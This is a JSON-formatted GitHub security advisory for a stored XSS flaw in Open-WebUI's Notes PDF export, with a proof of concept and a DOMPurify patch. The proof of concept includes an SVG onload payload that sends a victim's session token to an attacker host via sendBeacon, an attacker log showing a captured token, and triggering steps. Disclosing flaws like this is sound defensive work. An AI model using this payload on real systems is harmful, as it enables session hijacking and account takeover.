@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-8wvc-869r-xfqf",
+  "repo": {
+    "cve_id": "CVE-2025-65959",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.7,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "description": "## Summary\r\n\r\nA **Stored XSS vulnerability** has been discovered in Open-WebUI's Notes PDF download functionality. \r\nAn attacker can import a Markdown file containing malicious SVG tags into Notes, allowing them to **execute arbitrary JavaScript code** and **steal session tokens** when a victim downloads the note as PDF. \r\n\r\nThis vulnerability can be exploited by **any authenticated user**, and unauthenticated external attackers can steal session tokens from users (both admin and regular users) by sharing specially crafted markdown files.\r\n\r\n## Details\r\n\r\n### Vulnerability Location\r\n\r\n**File:** `src/lib/components/notes/utils.ts`  \r\n**Function:** `downloadPdf()`  \r\n**Vulnerable Code (Line 35):**\r\n\r\n```typescript\r\nconst contentNode = document.createElement('div');\r\n\r\ncontentNode.innerHTML = html;  // Direct assignment without DOMPurify sanitization\r\n\r\nnode.appendChild(contentNode);\r\ndocument.body.appendChild(node);\r\n```\r\n\r\n### Root Cause\r\n\r\n1. **Incomplete TipTap Editor Configuration**\r\n   - Open-WebUI only uses TipTap StarterKit\r\n   - No Schema definition for dangerous tags like SVG, Script\r\n   - Unknown HTML tags are stored as raw HTML\r\n   \r\n2. **Missing Sanitization During PDF Generation**\r\n   - `note.data.content.html` is directly assigned to `innerHTML`\r\n   - No DOMPurify or other sanitization\r\n   - Stored malicious HTML executes as-is\r\n\r\n\r\n## PoC\r\n\r\n### Environment\r\n- Open-WebUI latest version (v0.6.36)\r\n- Admin account\r\n\r\n### Step 1: Create Malicious Markdown File\r\n\r\n**Filename:** `token_stealer.md`\r\n\r\n```markdown\r\n<svg onload=\"navigator.sendBeacon('https://redacted/steal',localStorage.token)\"></svg>\r\n```\r\n> navigator.sendBeacon() was used to bypass CORS.\r\n\r\n### Step 2: Import to Notes\r\n\r\n1. Login to Open-WebUI\r\n2. Click **\"Notes\"** in the left menu\r\n3. **Drag and drop** the Markdown file\r\n4. Note is automatically created\r\n\r\n### Step 3: Trigger PDF Download\r\n\r\n1. Access Notes menu (/notes)\r\n2. Click **⋯** on the right side of the uploaded note\r\n3. Select **\"Download\"** → **\"PDF document (.pdf)\"**\r\n4. JavaScript executes\r\n\r\n### Step 4: Verify Token Theft\r\n\r\n**Attacker's server log:**\r\n```http\r\nPOST /steal HTTP/1.1\r\nHost: redacted\r\nContent-Type: text/plain;charset=UTF-8\r\nContent-Length: 145\r\n\r\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjVkMjE4ZmU4LTU2MTktNGEzNS05MWZkLTM2MzA3NDU1NGFkNCJ9.zOicE5c5FJ3ZOc9j6T2xHU-K6dbz-s1ib_hIG4LayFw\r\n```\r\n\r\n### And Simple PoC `alert(1)`\r\n**Filename:** `simple_poc.md`\r\n\r\n```markdown\r\n<svg onload=\"alert(1)\"></svg>\r\n```\r\n<img width=\"1089\" height=\"310\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ded7bb4a-d0e0-4614-8d64-3113c1f79e2f\" />\r\n\r\n\r\n---\r\n\r\n## Impact\r\n\r\n**CVSS 3.1 Score: 8.7 (High)**\r\n\r\n```\r\nCVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N\r\n```\r\n\r\n### Vulnerability Type\r\n**CWE-79: Cross-site Scripting (XSS)**  \r\n**CWE-116: Improper Encoding or Escaping of Output**\r\n\r\n### Affected Users\r\n- **All Open-WebUI users**\r\n- Especially users utilizing the Notes feature\r\n\r\n### Attack Scenario\r\n```\r\n1. Attacker shares malicious note (.md file) in the community\r\n2. Victim uploads the shared note (.md file)\r\n3. Victim downloads as PDF\r\n4. XSS vulnerability triggers\r\n5. Victim's session (localStorage.token) is stolen\r\n```\r\n\r\n---\r\n\r\n## Recommended Patch\r\n\r\n```typescript\r\n// src/lib/components/notes/utils.ts:35\r\nimport DOMPurify from 'dompurify';\r\n\r\nconst contentNode = document.createElement('div');\r\n\r\n// Sanitize with DOMPurify\r\ncontentNode.innerHTML = DOMPurify.sanitize(html, {\r\n    ALLOWED_TAGS: [\r\n        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',\r\n        'ul', 'ol', 'li', 'a', 'code', 'pre', 'blockquote', 'table', 'thead',\r\n        'tbody', 'tr', 'td', 'th'\r\n    ],\r\n    ALLOWED_ATTR: ['href', 'class', 'target'],\r\n    FORBID_TAGS: ['svg', 'script', 'iframe', 'object', 'embed', 'style'],\r\n    FORBID_ATTR: ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus'],\r\n    ALLOW_DATA_ATTR: false\r\n});\r\n\r\nnode.appendChild(contentNode);\r\n```\r\n\r\n---\r\n\r\n## References\r\n\r\n- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\r\n- DOMPurify: https://github.com/cure53/DOMPurify\r\n\r\n---\r\n\r\n",
+    "ghsa_id": "GHSA-8wvc-869r-xfqf",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-8wvc-869r-xfqf",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-8wvc-869r-xfqf"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-65959"
+      }
+    ],
+    "published_at": "2025-12-04T19:43:50Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Stored DOM XSS via Note 'Download PDF'",
+    "updated_at": "2025-12-04T19:43:50Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "open-webui"
+        },
+        "patched_versions": ">=0.6.37",
+        "vulnerable_version_range": "<=0.6.36"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
